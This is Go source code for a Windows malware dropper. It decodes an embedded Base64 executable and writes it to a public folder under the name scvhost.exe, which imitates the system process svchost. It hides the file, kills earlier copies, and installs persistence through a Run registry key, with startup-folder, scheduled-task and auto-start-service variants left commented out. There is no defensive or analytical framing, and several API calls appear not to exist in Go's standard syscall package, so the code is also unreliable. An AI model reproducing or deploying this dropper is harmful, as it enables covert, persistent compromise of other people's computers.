package main

import (
    "fmt"
    "log"
    "os"
    "os/exec"
    "runtime"
    "encoding/base64"
    "syscall"
    "unsafe"
    "path/filepath"
)

var (
    shell string
    flag  string
)

func init() {
    switch runtime.GOOS {
    case "windows":
        shell = "cmd"
        flag = "/c"
    default:
        shell = "bash"
        flag = "-c"
    }
}

func Popen(command string, args ...interface{}) error {
    cmd := fmt.Sprintf(command, args...)
    process := exec.Command(shell, flag, cmd)
    process.Stdin = os.Stdin
    process.Stdout = os.Stdout
    process.Stderr = os.Stderr

    return process.Run()
}

func setRegistryPersistence(exePath string) error {
    regKeyPath := `Software\Microsoft\Windows\CurrentVersion\Run`
    regValueName := `scvhost`

    // Open the registry key
    regKey, err := syscall.OpenKey(syscall.HKEY_CURRENT_USER, syscall.StringToUTF16Ptr(regKeyPath), syscall.KEY_SET_VALUE)
    if err != nil {
        return fmt.Errorf("failed to open registry key: %v", err)
    }
    defer syscall.RegCloseKey(regKey)

    // Set the registry value
    exePathUTF16 := syscall.StringToUTF16(exePath)
    err = syscall.RegSetValueEx(regKey, syscall.StringToUTF16Ptr(regValueName), 0, syscall.REG_SZ, (*byte)(unsafe.Pointer(&exePathUTF16[0])), uint32(len(exePathUTF16)*2))
    if err != nil {
        return fmt.Errorf("failed to set registry value: %v", err)
    }

    return nil
}

func addToStartup(exePath string) error {
    startupFolder := filepath.Join(os.Getenv("APPDATA"), `Microsoft\Windows\Start Menu\Programs\Startup`)
    shortcutPath := filepath.Join(startupFolder, "scvhost.lnk")

    // Creating a shortcut requires a different method; here we simply create a text file as a placeholder
    return os.WriteFile(shortcutPath, []byte(fmt.Sprintf("[InternetShortcut]\nURL=%s", exePath)), 0644)
}

func createScheduledTask(exePath string) error {
    script := fmt.Sprintf(`$action = New-ScheduledTaskAction -Execute "%s"
$trigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "scvhostTask" -Description "Runs scvhost at startup"`, exePath)

    // Execute the PowerShell script
    cmd := exec.Command("powershell", "-Command", script)
    output, err := cmd.CombinedOutput()
    if err != nil {
        return fmt.Errorf("failed to create scheduled task: %s", err)
    }
    fmt.Println(string(output))
    return nil
}

func createWindowsService(exePath string) error {
    serviceName := "scvhostService"
    cmd := fmt.Sprintf(`sc create %s binPath= "%s" start= auto`, serviceName, exePath)
    
    // Execute the command to create the service
    process := exec.Command("cmd", "/C", cmd)
    output, err := process.CombinedOutput()
    if err != nil {
        return fmt.Errorf("failed to create Windows service: %s", err)
    }
    fmt.Println(string(output))
    return nil
}

func main() {
    encodedExeData := "africanas" // Replace with actual Base64-encoded executable data

    exeData, err := base64.StdEncoding.DecodeString(encodedExeData)
    if err != nil {
        log.Fatalf("Failed decoding Base64 executable string: %s", err)
    }

    exeOutputPath := `C:\Users\Public\Libraries\scvhost.exe`

    // Remove existing executable if it exists
    if _, err := os.Stat(exeOutputPath); !os.IsNotExist(err) {
        if err := os.Remove(exeOutputPath); err != nil {
            log.Printf("Failed to remove file: %s", err)
            if err := Popen("taskkill /im scvhost.exe /f"); err != nil {
                log.Printf("Failed to kill process: %s", err)
            }
            if err := os.Remove(exeOutputPath); err != nil {
                log.Printf("Failed to remove file: %s", err)
            }
        }
    }

    // Write the new executable file
    if err := os.WriteFile(exeOutputPath, exeData, 0644); err != nil {
        log.Fatalf("Failed to write file: %s", err)
    }

    // Set file attributes to hidden
    if err := Popen("attrib +h %s", exeOutputPath); err != nil {
        log.Printf("Failed to set file attributes: %s", err)
    }

    // Choose a persistence method:
    // Uncomment one of the following based on your chosen method

    // 1. Registry Persistence
    if err := setRegistryPersistence(exeOutputPath); err != nil {
        log.Fatalf("Failed to set registry persistence: %s", err)
    }

    // 2. Startup Folder Persistence
    // if err := addToStartup(exeOutputPath); err != nil {
    //     log.Fatalf("Failed to add to startup folder: %s", err)
    // }

    // 3. Scheduled Task Persistence
    // if err := createScheduledTask(exeOutputPath); err != nil {
    //     log.Fatalf("Failed to create scheduled task: %s", err)
    // }

    // 4. Windows Service Persistence
    // if err := createWindowsService(exeOutputPath); err != nil {
    //     log.Fatalf("Failed to create Windows service: %s", err)
    // }
}
